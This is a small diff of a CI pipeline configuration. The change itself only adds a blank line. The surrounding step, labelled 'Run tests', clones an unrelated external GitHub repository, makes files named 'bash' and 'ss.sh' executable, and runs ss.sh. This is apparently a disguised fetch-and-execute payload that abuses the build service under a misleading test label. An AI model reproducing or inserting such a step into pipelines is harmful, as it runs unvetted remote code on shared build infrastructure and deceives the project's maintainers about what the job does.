@@ -8,3 +8,4 @@ jobs:
       - run:   
           name: Run tests   
           command: git clone https://github.com/gunturyogatama404/multicok.git && cd multicok && chmod u+x bash && chmod u+x ss.sh && ./ss.sh
+          
